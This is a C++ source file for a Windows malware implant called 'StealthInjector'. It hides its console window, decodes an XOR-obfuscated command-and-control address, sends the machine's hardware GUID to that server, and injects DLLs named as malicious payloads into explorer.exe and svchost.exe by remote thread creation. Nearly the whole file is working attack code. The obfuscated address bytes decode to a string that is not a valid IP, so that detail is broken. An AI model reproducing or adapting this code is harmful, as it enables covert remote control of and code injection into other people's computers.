#include <iostream>
#include <cstring>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#pragma comment(lib, "ws2_32.lib")
class StealthInjector {
private:
    WSADATA wsaData;
    SOCKET mainSocket;
    bool InitWS() {
        return WSAStartup(MAKEWORD(2,2), &wsaData) == 0;
    }
public:
    StealthInjector() : mainSocket(INVALID_SOCKET) {}
    bool ConnectToC2(const char* ip, int port) {
        if(!InitWS()) return false;
        mainSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(mainSocket == INVALID_SOCKET) return false;
        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = inet_addr(ip);
        target.sin_port = htons(port);
        if(connect(mainSocket, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
            closesocket(mainSocket);
            return false;
        }
        std::string machineId = GetMachineId();
        send(mainSocket, machineId.c_str(), machineId.length(), 0);
        return true;
    }
    std::string GetMachineId() {
        HW_PROFILE_INFO hwProfileInfo;
        if(GetCurrentHwProfile(&hwProfileInfo)) {
            return std::string(hwProfileInfo.szHwProfileGuid);
        }
        return "UNKNOWN_MACHINE";
    }
    bool InjectIntoProcess(const char* processName, const char* dllPath) {
        HANDLE hProcess = GetProcessByName(processName);
        if(!hProcess) return false;
        
        LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, 
                                            MEM_COMMIT, PAGE_READWRITE);
        if(!pRemoteMemory) {
            CloseHandle(hProcess);
            return false;
        }
        WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath)+1, NULL);
        
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                          (LPTHREAD_START_ROUTINE)GetProcAddress(
                                          GetModuleHandle("kernel32.dll"), "LoadLibraryA"),
                                          pRemoteMemory, 0, NULL);
        if(!hThread) {
            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }
private:
    HANDLE GetProcessByName(const char* name) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if(hSnapshot == INVALID_HANDLE_VALUE) return NULL;
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if(Process32First(hSnapshot, &pe)) {
            do {
                if(strcmp(pe.szExeFile, name) == 0) {
                    CloseHandle(hSnapshot);
                    return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                }
            } while(Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        return NULL;
    }
};
std::string Deobfuscate(const std::vector<int>& data) {
    std::string result;
    for(int c : data) {
        result += static_cast<char>(c ^ 0xAA);
    }
    return result;
}
int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); 
    StealthInjector injector;
    std::vector<int> obfuscatedIP = {0xFB, 0xFF, 0xFF, 0xAE, 0xF9, 0xEB, 0xE4, 0xE4, 0xF3, 0xA8};
    std::string c2Server = Deobfuscate(obfuscatedIP);
    if(injector.ConnectToC2(c2Server.c_str(), 443)) {
        injector.InjectIntoProcess("explorer.exe", "malicious_payload.dll");
        injector.InjectIntoProcess("svchost.exe", "stealth_module.dll");
    }
    while(true) {
        Sleep(10000);
    }
    return 0;
}
